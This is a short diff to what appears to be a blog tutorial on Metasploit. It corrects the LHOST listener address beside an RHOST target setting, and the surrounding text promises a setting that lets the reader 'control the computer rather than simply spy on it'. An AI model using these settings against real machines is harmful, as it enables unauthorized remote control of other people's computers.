@@ -70,7 +70,7 @@ set RHOST 192.168.1.244
 {% endhighlight %}
 
 {% highlight ruby %}
-set LHOST 192.168.1.244
+set LHOST 192.168.1.48
 {% endhighlight %}
 
 We have everything we need right? Just one more setting. This will allow us to controll the computer rather than simply spy on it.
